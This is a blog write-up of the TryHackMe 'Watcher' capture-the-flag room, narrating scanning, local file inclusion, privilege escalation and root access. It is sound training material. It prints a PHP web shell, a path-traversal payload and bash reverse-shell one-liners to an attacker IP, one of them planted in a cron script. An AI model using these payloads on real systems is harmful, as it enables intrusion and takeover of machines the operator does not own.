---
title: Watcher | Tryhackme write up
date: 2022-05-13 18:30:00 +0200
categories: [Blog, Writeup]
tags: [writeup, tryhackme, pentesting, penetration, testing, hacking, ethical, sudo privesc, fuzzing, enumeration, local, file, inclusion, LFI, cron job,watcher, medium]
comments: false

---

Hi! this is my take on Watcher CTF from TryHackme, the room is simple but very entertaining.
At first it seemed that it was going to be too easy but I liked that there were several privilege escalations and all of them were different.

These are some topic you will see in this room: 
- Directory fuzzing
- Local file inclusion
- Upload malicious file
- Abuse of sudo permissions for privilege escalation
- Abuse of cron job for privilege escalation

# Scanning

To know what os I'm facing i start by running **ping -c 1 <VICTIMIP>**, thanks to the TTL i can guess that this is a Linux box.
I continue by running **Nmap** three times,I am using Syn scan against the whole port range of the victim machine,
which shows me that there are three open ports, 21, 22 and 80.

![First Nmap scan for open ports](/assets/img/watcher/001.PNG)
_Nmap scanning for open ports_

Knowing this I re-launch it with the C and V scripts to find out version and service.

![Second Nmap scan for versions](/assets/img/watcher/002.PNG)
_**-sCV** scan to know versions_
And finally with the **http-enum** script, which uses a small dictionary to fuzz well known routes. 

![Second Nmap scan for versions](/assets/img/watcher/002.PNG)
_**-sCV** scan to know versions_

![Http-enum results](/assets/img/watcher/003.PNG)
_http-enum script results_

There's nothing weird and the discovery of robots.txt its interesting so I'm checking the web and robots.txt now.

![Website homepage](/assets/img/watcher/004.PNG)
_Website homepage_

The web is running with Apache and seems like a Jekyll blog, some buttons are not even working so I'm going straight to robots.txt.

![robots.txt contents](/assets/img/watcher/005.PNG)
_robots.txt contents_
There are 2 file routes inside robots.txt the first one is accessible and it's the first flag, the second one requires permissions that i dont have.

![First flag](/assets/img/watcher/006.PNG)
_First flag_

Looking again at the home page, I see something suspicious in the links of each post, it seems that the web could be vulnerable to LFI(Local File Inclusion)

![Web could be vulnerable to LF](/assets/img/watcher/007.PNG)
_Vulnerable to LFI?_

I'm trying to list /etc/passwd and for that i'm using this route: http://VICTIMIP/post.php?post=../../../../../../etc/passwd. It works!

![/etc/passwd content](/assets/img/watcher/008.PNG)
_Content of /etc/passwd_

I can see that there's three users: **toby, mat and will**.

# Gaining access

I start by showing **/secret_file_do_not_read.txt**, the file i couldn't read before because I had no permissions.
But now with LFI it's easy to see it's contents:

![/secret_file_do_not_read.txt contents](/assets/img/watcher/009.PNG)
_/secret_file_do_not_read.txt contents_

Reading this, I already know what i have to do, i have to login into ftp and try upload a malicious .php file because now i know
where there route to that file is.

The credentials were valid, and now I'm login into ftp, where the **second flag** is located, and a **files** directory next to it.

![Ftp contents](/assets/img/watcher/010.PNG)
_Ftp contents_

I'm next writing my malicious file and uploading it into this files folder.
This is the code I'm using:
```php
<?php
system($_GET['cmd']) 
?>
```
This code permits us to run a command with the GET request variable 'cmd'.
The upload is completed, and i know where the file exactly is.
I show the file with the LFI i used before, running **whoami** with our new cmd variable.

![Remote code execution working](/assets/img/watcher/011.PNG)
_Remote code execution working_

To get a reverse shell, im gonna run this with my new RCE method, and I'm url encoding it:
```bash
bash -c 'bash -i >& /dev/tcp/MYIP/443 0>%1'
```
At the same time I'm listening port 443 with netcat.
```bash
nc -lnvp 443
```
With this i gained access as www-data

![Access gained as www-data](/assets/img/watcher/012.PNG)

_Access gained as www-data_

# Privilege escalation

## First privilege escalation

After treating the terminal to turn it into an interactive one, I run **sudo -l** and see that i can run any command i want as toby without password,
so i run **sudo -u toby bash** and I'm now toby.

![privesc toby](/assets/img/watcher/013.PNG)
_Easy privesc to toby_

## Second privilege escalation

I continue by visiting toby's home and there's a note next to flag 3 and a directory called jobs. This is the content of note.txt

![note.txt content](/assets/img/watcher/014.PNG)
_note.txt content_

There's a cron job running and i guess it's running into jobs directory. There's a file inside jobs directory called **cow.sh**,
it's a script that backups an image into /tmp directory, but i have write permissions, so i change it's contents to this:
```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/MYIP/444 0>%1'
```
I'm using port 444 now as I'm still using 443 for the reverse shell I'm actually using. After listening with netcat and waiting a minute, I get a reverse shell as Mat.

![privesc mat](/assets/img/watcher/015.PNG)
_Privesc to Mat_

## Second privilege escalation

As before, the first two things i do is **sudo -l** and visiting my home. I can run python3 with a specific file as will and that file is inside my home.

v![sudo mat](/assets/img/watcher/016.PNG)
_Sudo for mat_

The code of this will_script let's me run three commands, ls, id and cat /etc/passwd, and it does it by calling a function from another script cmd.py.
But I'm realizing that I'm the owner of cmd.py and i can write inside.

![Code permissions](/assets/img/watcher/017.PNG)
_Code of both scripts and permissions_

I'm editing cmd.py code to run a bash instead ls -lah when using 1 as argument, and because i can run it as will, this bash will be as will too.

![new cmd.py](/assets/img/watcher/018.PNG)
_New cmd.py code_
And it works.

![privesc will](/assets/img/watcher/019.PNG)
_Privilege escalation to will_

## Last privilege escalation to root
I struggled a bit with this privilege escalation because I lost like 15min investigating around **adm** group and checking log files from /var/log,
but after a bit i realized that there's nothing there and after cheking some things like sudo -l, SUID files, I found a backups directory inside /opt.
There's a file named key.b64 inside, I'm decoding the content with base 64 and a private key is showing.

![Private ssh key found](/assets/img/watcher/020.PNG)
_Private ssh key found_

After putting the key into an id_rsa file and using it like this from my terminal: **ssh -id id_rsa root@VICTIMIP**

![Access as root](/assets/img/watcher/021.PNG)
_Access as root_

I got access as root!. Flags 4,5,6 and 7 was in /home/toby, /home/mat, /home/will and /root directories respectively, while flag 3 was in /var/www/html/

See you soon and enjoy this nice CTF!
